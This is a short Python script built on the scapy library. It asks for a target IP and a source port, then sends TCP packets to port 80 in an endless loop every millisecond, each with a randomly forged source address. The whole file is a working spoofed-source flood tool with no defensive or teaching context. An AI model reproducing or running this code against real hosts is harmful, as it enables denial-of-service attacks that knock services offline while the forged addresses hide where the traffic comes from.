from scapy.all import *
import socket
import struct
import random

sourceIP = str(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))) #Because random
source_port = int(raw_input("Enter the port from where to send the packets "))

target = raw_input("Enter the objetive IP ")


IP = IP(src = sourceIP, dst = target)
TCP = TCP(sport = source_port, dport = 80)
packet = IP/TCP

while True:  
    send(packet, inter = 0.001)



